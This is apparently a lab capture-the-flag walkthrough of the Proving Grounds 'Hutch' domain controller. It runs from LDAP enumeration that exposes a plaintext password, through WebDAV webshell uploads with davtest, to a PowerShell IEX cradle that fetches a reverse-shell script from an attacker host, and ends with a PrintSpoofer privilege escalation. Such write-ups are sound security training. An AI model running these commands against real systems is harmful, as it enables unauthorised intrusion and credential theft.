# PG Hutch
## nmap
```

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_  WebDAV type: Unknown   <--------- WEBDAV Is Running! 
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-17 04:05:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name) <--- Domain Name Retrieved
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49763/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

NetExec smb 192.168.164.122 -u '' -p ''  <-- Double Checking Domain Name via NetExec
SMB         192.168.164.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.164.122 445    HUTCHDC          [-] hutch.offsec\: STATUS_ACCESS_DENIED 
```
## ldapsearch
```
List user and passwords with ldap. domain:hutch.offsec, "dc=hutch,dc=offsec"
ldapsearch -x -h 192.168.164.122 -b "dc=hutch,dc=offsec" "*"    
 Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c hange on next login.  <----Credential Acquired. 
```
## WebDAV
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
WebDav enabled and lets you upload.
Check which file extensions are executable with davtest:
davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.164.122

/usr/bin/davtest Summary:
Created: http://192.168.164.122/DavTestDir_9TpqP6
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.jhtml
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.html
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.pl
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.jsp
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.php
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.shtml
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.aspx
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.txt
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.cgi
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.asp
PUT File: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.cfm
Executes: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.html
Executes: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.aspx
Executes: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.txt
Executes: http://192.168.164.122/DavTestDir_9TpqP6/davtest_9TpqP6.asp
PUT Shell: http://192.168.164.122/DavTestDir_9TpqP6/9TpqP6_aspx_cmd.aspx  <----Webshell 
PUT Shell: http://192.168.164.122/DavTestDir_9TpqP6/9TpqP6_asp_cmd.asp
PUT Shell: http://192.168.164.122/DavTestDir_9TpqP6/9TpqP6_aspx_cmd.aspx
```
## Access
```
davtest hooks it up and puts a shell for you, code execution obtained. 
http://192.168.164.122/DavTestDir_9TpqP6/9TpqP6_aspx_cmd.aspx
Use your webshell to get a full shell. 
powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.49.164/tcp_power.ps1')
```
## PrivEsc PrintSpoofer64.exe
```
Host Name:                 HUTCHDC
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User

Since the ImpersonatePrivilege is enabled and it's 2019 Windows Server, it's not vulnerable to Potato, but is to PrintSpoofer.
Powershell (New-Object Net.WebClient).DownloadFile("http://192.168.49.164/PrintSpoofer64.exe","C:\Windows\Temp\PrintSpoofer.exe")
.\PrintSpoofer64.exe -i -c cmd
```









